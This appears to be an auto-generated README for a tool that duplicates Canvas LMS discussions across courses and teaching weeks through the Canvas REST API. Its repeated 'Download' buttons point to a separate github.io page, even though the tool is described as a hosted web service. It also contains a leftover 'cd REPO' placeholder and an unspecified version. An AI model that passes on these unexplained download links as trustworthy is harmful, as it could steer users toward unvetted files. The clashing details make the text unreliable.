# Canvas Discussion Duplicator - Education Automation Tool 2026

> **Canvas Discussion Duplicator is a hosted web application that uses the Canvas REST API to copy and arrange Canvas LMS discussions between courses and teaching weeks.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20Specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonrossoimx1849/canvas-lms-discussion-duplicator?style=flat-square)](https://github.com/masonrossoimx1849/canvas-lms-discussion-duplicator)

---

<p align="center">
  <a href="https://masonrossoimx1849.github.io/canvas-lms-discussion-duplicator/">
    <img src="https://img.shields.io/badge/Download-Canvas%20Discussion%20Duplicator%20Latest-brightgreen?style=for-the-badge" alt="Download Canvas Discussion Duplicator">
  </a>
</p>

> **[Download Canvas Discussion Duplicator](https://masonrossoimx1849.github.io/canvas-lms-discussion-duplicator/)**

---

[Download Latest Build](https://masonrossoimx1849.github.io/canvas-lms-discussion-duplicator/)

---

## Overview

Canvas Discussion Duplicator helps instructors and education teams manage recurring discussion setup in Canvas LMS. Through its web interface, users can reproduce discussions across multiple teaching weeks or distribute them among one or more courses instead of rebuilding each discussion manually.

The service communicates with Canvas using the Canvas REST API. Its workflow includes discussion matching, renaming, review, and publishing options. Before any updates are submitted, the pre-run check displays the changes that are about to be made.

---

## Key Capabilities

- Replicate Canvas discussions across several teaching weeks.
- Transfer discussions between one or more Canvas courses.
- Assign new names while creating duplicated discussions.
- Find source discussions by exact title or by a unique partial title.
- Inspect intended changes through a pre-run validation step.
- Publish copied discussions when publishing is selected.
- Integrate with Canvas through its REST API.
- Run the application as a hosted web service.

---

## Installation and Deployment

Canvas Discussion Duplicator is intended for web deployment and may be hosted with a platform such as Render.

First, retrieve the repository and move into the project folder:

    git clone https://github.com/masonrossoimx1849/canvas-lms-discussion-duplicator.git
    cd REPO

Install the Python packages specified by the project, then launch the web application with its configured Python entry point. For a hosted installation, link the repository to Render and add the runtime configuration required by the application.

Once the service is running, access its application URL in a web browser. This is normally the first step for using a new deployment.

---

## Using the Application

1. Visit the hosted Canvas Discussion Duplicator application.
2. Enter the Canvas connection information requested by the interface.
3. Choose the source course and the discussion or discussions to duplicate.
4. Select the destination course or courses and the applicable teaching weeks.
5. Pick exact-title matching or unique partial-title matching.
6. Provide replacement names for the copied discussions if necessary.
7. Start the pre-check and examine the proposed operation.
8. Confirm the workflow to create the duplicated discussions.
9. Turn on publishing for any copied discussions that should be published.

The review stage provides an opportunity to verify the selected courses, matched discussions, assigned names, and publishing settings before the application sends changes to Canvas through the REST API.

---

## Deployment Configuration

The application receives its settings from the web deployment environment rather than from a desktop configuration file. When using Render, place the Canvas API details and other application settings required by the project in the service environment.

A representative configuration looks like this:

    CANVAS_BASE_URL=https://canvas.example.edu
    CANVAS_API_TOKEN=your_canvas_api_token

Use the variable names and values defined by the application's deployment files. API tokens and other credentials should not be committed to the repository; configure them through the hosting provider's environment settings instead.

---

## Requirements

- A web browser to access the application.
- Access to a Canvas LMS installation.
- Canvas API credentials authorized for the chosen courses and discussions.
- Python runtime support when running the application locally.
- A hosting service such as Render for hosted operation.
- Network connectivity between the application and the Canvas REST API.
- Sufficient storage and runtime resources for the selected hosting setup.

---

## Frequently Asked Questions

### Who can use Canvas Discussion Duplicator?

The tool is aimed at instructors and course administrators who reuse Canvas discussions across different weeks or courses.

### Can discussions be moved between courses?

Yes. Discussions can be copied across one or more Canvas courses.

### What matching methods are available?

The source can be located through an exact title match or a unique partial title match.

### Is renaming supported?

Yes. You can provide a new name during the duplication workflow.

### Will copied discussions be published automatically?

Publishing is available as an explicit choice. Check the pre-run results and publishing selection before confirming the task.

### Where do I configure the application?

Hosted installations should use the service's environment settings, including the settings available through Render. For local use, follow the configuration conventions defined by the project's Python application files.

### What should I verify when an operation fails?

Check the Canvas base URL, API credentials, and account access to the selected courses. Also confirm that the discussion title returns either an exact match or a unique partial match. Use the pre-run check to review the operation before trying again.

### How are new versions provided?

Updates are available through the repository or through the hosted deployment connected to the project. The available project metadata does not specify the current release version.

---

## Planned Improvements

- Further streamline discussion selection and pre-run review.
- Make course and week organization more effective for larger duplication jobs.
- Continue improving the hosted deployment experience.
- Add more documentation for Canvas API setup and troubleshooting.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
